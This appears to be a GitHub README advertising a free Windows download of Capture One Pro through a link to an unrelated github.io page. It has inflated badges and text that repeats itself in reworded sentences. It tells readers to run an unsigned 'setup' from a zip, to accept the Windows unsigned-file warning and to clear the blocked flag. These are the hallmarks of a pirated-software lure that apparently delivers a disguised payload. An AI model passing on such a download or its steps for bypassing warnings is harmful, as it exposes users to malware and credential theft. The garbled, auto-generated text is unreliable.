# Capture One Pro - Build download for Desktop

# [Download Capture One Pro now](https://TeraPhoenixReactor.github.io/Editing-Pipeline-Capture-One/files/)

![scope](https://img.shields.io/badge/release-stable-9a6700?style=flat&logo=windows&logoColor=white) ![dew](https://img.shields.io/badge/system-Windows-9a6700?style=flat&logo=windows&logoColor=white) ![cumulus](https://img.shields.io/badge/downloads-37.8k-9a6700?style=flat&logo=windows&logoColor=white) ![ash](https://img.shields.io/badge/status-active-9a6700?style=flat&logo=windows&logoColor=white) ![film](https://img.shields.io/badge/arch-x64-9a6700?style=flat&logo=windows&logoColor=white) ![caption](https://img.shields.io/badge/version-v4.6.7-9a6700?style=flat&logo=windows&logoColor=white)

Installing Capture One Pro on your Windows desktop allows for a tailored editing experience with advanced masking capabilities, ensuring that edits to skin tones do not interfere with other elements in your images

![Capture One Pro screenshot](.github/coyote.jpg)

## Something not working?

A recording is not required. Enough of the problem shows up in three written steps.

Showing the problem takes three steps. A video does not have to be part of that.

## Enough to start

The hardware floor is low:

1. A Microsoft account is not required.
2. This program requires Windows 10 or later to run.
3. Your account needs permission to write in the folder you use.
4. A 64-bit edition of Windows is what this build expects.

---

## Release notes

- A zip holding one folder is what you download.
  - Fresh downloads can cause Windows to show the unsigned-file warning another time.
- Make a copy of any files you added to this folder before extracting a replacement archive over it
- Extract the zip file and run `setup` to start the program

## Features

In short:

* Starting means launching `setup` in the folder that was extracted.
* Launching skips any wizard and any choice of a destination folder.
* The extracted folder can be renamed after extraction.
* An unsigned file may draw a single warning from Windows.
* To remove it, delete the folder.
* Expect a brief pause the first time it opens, then shorter waits on later opens.

## Troubleshooting

<details><summary>You were still inside the compressed file</summary>

Unpacking has to happen before a click can reach a real file.
</details>

<details><summary>Setup opens and closes right away</summary>

Start it from a Command Prompt in the same folder. The console keeps the message that was closing with the window.
</details>

<details><summary>Non-English Windows shows question marks in the title</summary>

Change Region, Administrative, Language for non-Unicode programs to English, or run the build in an account whose language setting matches.
</details>

<details><summary>Blocked flag survived the download</summary>

Tick Unblock in Properties, then give `setup` a fresh start.
</details>

<details><summary>A second zip raised the warning again</summary>

Windows treats the new file as a new download.
</details>

## Overview

Get the program running by extracting the zip archive and running the file named `setup`. A later build is a new archive you download and start the same way.

Using the program means unpacking the zip and running the file named `setup`, while a later build is another archive downloaded and started the same way.

Files the archive created are in the extracted folder. Removing that folder takes them away.
